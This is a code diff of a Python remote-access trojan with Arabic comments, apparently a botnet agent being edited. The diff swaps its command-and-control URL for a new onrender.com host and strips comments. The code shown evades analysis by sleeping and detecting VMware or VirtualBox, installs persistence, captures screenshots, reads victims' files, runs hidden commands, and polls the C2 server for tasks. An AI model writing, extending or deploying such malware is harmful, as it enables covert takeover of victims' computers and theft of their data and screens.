@@ -6,31 +6,25 @@ import platform
 import subprocess
 import base64
 import sys
-import shutil
 import threading
 import random
 
 # ============================================================
-# 🔴 عوض الرابط هنا بالرابط ديالك (Render.com مثلاً)
-# ============================================================
-C2_URL = "https://myc2panel.onrender.com"
+# 🔴 عوض الرابط هنا بالرابط ديالك بعد النشر
+# ============================================================  # غيّر هذا
+C2_URL = "https://promal.onrender.com"   # يجب أن يكون هذا هو الرابط نفسه
 
 BOT_ID = socket.gethostname() + "_" + os.getenv('USERNAME', 'user')
 current_directory = os.getcwd()
 VERSION = "3.1"
 
-# ========== تقنيات تجنب التحليل ==========
 def anti_sandbox():
-    """تأخير بسيط لتجاوز بيئات التحليل السريعة"""
-    time.sleep(60)  # انتظر دقيقة قبل بدء العمل
-    # كشف البيئة الافتراضية (مثال بسيط)
+    time.sleep(60)
     if os.path.exists("C:\\Program Files\\VMware\\") or os.path.exists("C:\\Program Files\\VirtualBox\\"):
-        # إذا كان في جهاز افتراضي، ننام فترة طويلة جداً
-        time.sleep(3600)  # ساعة كاملة
+        time.sleep(3600)
         return False
     return True
 
-# ========== الثبات ==========
 def install_persistence():
     try:
         script_path = os.path.abspath(sys.argv[0])
@@ -54,7 +48,6 @@ shortcut.Save
     except:
         return False
 
-# ========== تصوير الشاشة ==========
 def take_screenshot():
     try:
         from PIL import ImageGrab
@@ -66,7 +59,6 @@ def take_screenshot():
     except:
         return "[ERROR] Screenshot failed"
 
-# ========== تحميل الملفات ==========
 def download_file(filepath):
     try:
         if not os.path.exists(filepath):
@@ -77,7 +69,6 @@ def download_file(filepath):
     except Exception as e:
         return f"[ERROR] Cannot read file: {e}"
 
-# ========== التنفيذ المخفي ==========
 def execute_any_command(cmd, cwd):
     try:
         CREATE_NO_WINDOW = 0x08000000
@@ -104,18 +95,14 @@ def execute_any_command(cmd, cwd):
         return f"[ERROR] {e}"
 
 # ========== البداية ==========
-# تجنب التحليل
 if not anti_sandbox():
-    # إذا كشف بيئة افتراضية، ينام لفترة طويلة جداً
     while True:
         time.sleep(3600)
 
 print(f"[+] Agent v{VERSION} started. ID: {BOT_ID}")
 
-# تثبيت الثبات في خلفية
 threading.Thread(target=install_persistence, daemon=True).start()
 
-# التسجيل مع إعادة المحاولة
 registered = False
 while not registered:
     try:
@@ -128,7 +115,6 @@ while not registered:
     except:
         time.sleep(10)
 
-# ========== الحلقة الرئيسية ==========
 while True:
     try:
         resp = requests.get(f"{C2_URL}/get_task", params={"id": BOT_ID}, timeout=5)
@@ -167,4 +153,3 @@ while True:
     except Exception as e:
         pass
     time.sleep(2)
-    
